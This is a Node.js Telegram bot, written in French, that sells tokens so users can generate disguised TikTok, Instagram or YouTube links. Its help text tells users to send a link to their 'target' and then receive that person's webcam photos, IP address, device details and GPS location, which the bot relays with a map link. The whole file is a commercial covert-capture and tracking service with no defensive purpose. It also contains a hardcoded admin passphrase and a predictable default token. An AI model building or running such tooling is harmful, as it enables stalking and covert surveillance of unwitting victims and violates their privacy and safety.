const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const dotenv = require("dotenv");
const fs = require('fs');
const path = require('path');
const crypto = require("crypto");

// Configuration de l'environnement
dotenv.config();

// --- 1. GESTION DE LA PERSISTANCE (SAUVEGARDE) ---
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir);
}

const usersFilePath = path.join(dataDir, 'users.json');

let usersData = {};
if (fs.existsSync(usersFilePath)) {
    try {
        usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));
    } catch (e) {
        console.error("⚠️ Erreur lecture users.json, réinitialisation.", e.message);
        usersData = {};
    }
}

function saveUsers() {
    try {
        fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
    } catch (e) {
        console.error("❌ Erreur de sauvegarde :", e.message);
    }
}

// --- 2. CONFIGURATION DU BOT ---
process.env.NTBA_FIX_319 = 1;
process.env.NTBA_FIX_350 = 1;

const originalLog = console.log;
console.log = (...args) => {
    const message = args.join(" ");
    if (message.includes("TLSWrap") || message.includes("Symbol(") || message.includes("kBuffer")) return;
    originalLog.apply(console, args);
};

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error("❌ TELEGRAM_BOT_TOKEN manquant !");
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: {
        autoStart: true,
        params: { timeout: 10 }
    } 
});

const BASE_URL = process.env.RENDER_EXTERNAL_URL 
    ? process.env.RENDER_EXTERNAL_URL.replace(/\/$/, "")
    : `http://localhost:${process.env.PORT || 5000}`;

const DEFAULT_SECURE_TOKEN = "secure_default_token_" + crypto.createHash("sha256").update("replit_telegram_bot_2024").digest("hex");
const authToken = process.env.DATA_ACCESS_TOKEN || DEFAULT_SECURE_TOKEN;

let isAdminMode = false;

console.log(`🤖 Bot Telegram démarré !`);
console.log(`📡 Connecté au backend : ${BASE_URL}`);

// --- 3. COMMANDES ADMINISTRATEUR ---

bot.onText(/DsSiakaAdmin/, (msg) => {
    isAdminMode = true;
    bot.sendMessage(msg.chat.id, "🔓 **Mode Admin ACTIVÉ !**\n\nCommandes :\n`/addcoins [ID] [MONTANT]`\n`/lock` pour verrouiller.", { parse_mode: "Markdown" });
});

bot.onText(/\/lock/, (msg) => {
    isAdminMode = false;
    bot.sendMessage(msg.chat.id, "🔒 **Mode Admin VERROUILLÉ.**");
});

bot.onText(/\/addcoins (\d+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAdminMode) return bot.sendMessage(chatId, "🚫 **Accès refusé.**");

    const targetId = match[1];
    const amount = parseInt(match[2]);

    if (!usersData[targetId]) usersData[targetId] = { coins: 0 };
    usersData[targetId].coins += amount;
    
    saveUsers();
    
    bot.sendMessage(chatId, `✅ **Succès !**\n${amount} jetons ajoutés à l'utilisateur \`${targetId}\`.\nNouveau solde : ${usersData[targetId].coins} 🪙`, { parse_mode: "Markdown" });
    
    bot.sendMessage(targetId, `🎁 **Paiement Reçu !**\nL'admin vous a crédité de ${amount} jetons.\nNouveau solde : ${usersData[targetId].coins} 🪙`).catch(() => {});
});

// --- 4. COMMANDES UTILISATEUR & VENTE ---

// /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const coins = usersData[chatId]?.coins || 0;
    
    bot.sendMessage(chatId, 
        `🔥 *Bot de Capture Activé !*\n\n` +
        `💰 *Votre Solde :* ${coins} jetons\n\n` +
        `🎯 *Menu :* \n` +
        `/generate - Créer un lien (1 🪙)\n` +
        `/acheter - Acheter des jetons 💎\n` +
        `/balance - Voir mon solde\n` +
        `/help - Aide`, 
        { parse_mode: "Markdown" }
    );
});

// /acheter (COMMANDE DE VENTE)
bot.onText(/\/acheter/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        `💎 **ACHETER DES JETONS** 💎\n\n` +
        `Pour recharger votre compte, contactez :\n` +
        `👉 **@DsSiaka**\n\n` +
        `🆔 **Ton ID à lui donner :** \`${chatId}\`\n\n` +
        `⚡ Paiement rapide et recharge immédiate !`, 
        { parse_mode: "Markdown" }
    );
});

// /balance
bot.onText(/\/balance/, (msg) => {
    const coins = usersData[msg.chat.id]?.coins || 0;
    bot.sendMessage(msg.chat.id, `💰 **Portefeuille :** ${coins} jetons 🪙\nBesoin de plus ? Contactez @DsSiaka`, { parse_mode: "Markdown" });
});

// /generate (GÉNÉRATION AVEC VÉRIFICATION)
bot.onText(/\/generate/, (msg) => {
    const chatId = msg.chat.id;
    const coins = usersData[chatId]?.coins || 0;

    // --- MODIFICATION ICI : MESSAGE SOLDE INSUFFISANT ---
    if (coins <= 0) {
        return bot.sendMessage(chatId, 
            `⚠️ **Solde insuffisant !**\n\n` +
            `Il vous faut 1 jeton pour générer un lien.\n\n` +
            `🛒 **Pour recharger votre compte :**\n` +
            `Contactez l'administrateur 👉 **@DsSiaka**`, 
            { parse_mode: "Markdown" }
        );
    }

    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🎵 TikTok", callback_data: "tiktok" }, { text: "📸 Instagram", callback_data: "instagram" }],
                [{ text: "📺 YouTube", callback_data: "youtube" }],
            ],
        }
    };

    bot.sendMessage(chatId, `🎯 *Générateur de Liens*\n\nSolde : ${coins} 🪙\nCoût : 1 🪙\n\n*Choisis la plateforme :*`, { parse_mode: "Markdown", ...keyboard });
});

// --- 5. GESTION DES CLICS ---
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (data.startsWith("data_")) {
        bot.answerCallbackQuery(query.id);
        const linkId = data.replace("data_", "");
        await sendDataById(chatId, linkId);
        return;
    }

    const platform = data;
    
    // --- MODIFICATION ICI : ALERTE SOLDE INSUFFISANT ---
    if (!usersData[chatId] || usersData[chatId].coins <= 0) {
        bot.sendMessage(chatId, "❌ **Solde épuisé !** Contactez @DsSiaka pour recharger.");
        return bot.answerCallbackQuery(query.id, { text: "❌ Solde insuffisant ! Contactez @DsSiaka", show_alert: true });
    }

    try {
        const response = await axios.post(`${BASE_URL}/generate-link`, { platform, chatId });
        const { id, url } = response.data;

        usersData[chatId].coins -= 1;
        saveUsers();

        bot.answerCallbackQuery(query.id, { text: "✅ Lien généré ! -1 Jeton" });

        const message = `✅ *LIEN CRÉÉ !*\n\n` +
                        `🔗 ${url}\n\n` +
                        `💰 Restant : ${usersData[chatId].coins} 🪙\n` +
                        `⚡ En attente du clic...`;

        const keyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔗 Ouvrir", url: url }],
                    [{ text: "📊 Voir Données", callback_data: `data_${id}` }]
                ]
            }
        };

        bot.sendMessage(chatId, message, { parse_mode: "Markdown", disable_web_page_preview: true, ...keyboard });

    } catch (error) {
        console.error("Erreur génération:", error.message);
        bot.answerCallbackQuery(query.id, { text: "❌ Erreur serveur", show_alert: true });
    }
});

// --- 6. AFFICHAGE DONNÉES ---

bot.onText(/\/data (.+)/, async (msg, match) => {
    await sendDataById(msg.chat.id, match[1].trim());
});

async function sendDataById(chatId, linkId) {
    try {
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
            headers: { Authorization: `Bearer ${authToken}` },
        });
        const data = response.data;

        let message = `📊 *RAPPORT* - \`${linkId}\`\n\n`;
        message += `⏰ ${new Date(data.timestamp).toLocaleString("fr-FR")}\n`;
        message += `🌐 IP: ${data.ip || "Masquée"}\n`;

        if (data.location && data.location.latitude) {
            message += `📍 ${data.location.city || "?"}, ${data.location.country || "?"}\n`;
        }

        if (data.device) {
            message += `📱 ${data.device.vendor || ""} ${data.device.model || "Mobile"}\n`;
        }

        message += `📸 Photos : ${data.images ? data.images.length : 0}`;

        await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

        if (data.images && data.images.length > 0) {
            const imgBuffer = Buffer.from(data.images[0], "base64");
            await bot.sendPhoto(chatId, imgBuffer, { caption: "📸 Photo 1" });
        }

        if (data.location && data.location.latitude) {
            const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
            bot.sendMessage(chatId, `🗺️ [Voir sur la carte](${mapsUrl})`, { parse_mode: "Markdown", disable_web_page_preview: false });
        }

    } catch (error) {
        bot.sendMessage(chatId, `❌ Pas de données pour \`${linkId}\``, { parse_mode: "Markdown" });
    }
}

// /help (MODIFICATION ICI : AJOUT CONTACT)
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, 
        `📚 *AIDE*\n\n` +
        `1. /generate pour créer un lien.\n` +
        `2. Envoie le lien à ta cible.\n` +
        `3. Reçois les photos et la position ici.\n\n` +
        `💎 **Besoin de jetons ?**\nContactez l'admin : **@DsSiaka**`, 
        { parse_mode: "Markdown" }
    );
});

// Erreurs
bot.on("polling_error", (error) => console.log(`⚠️ Erreur Polling: ${error.message}`));
bot.on("webhook_error", (error) => console.log(`⚠️ Erreur Webhook: ${error.message}`));
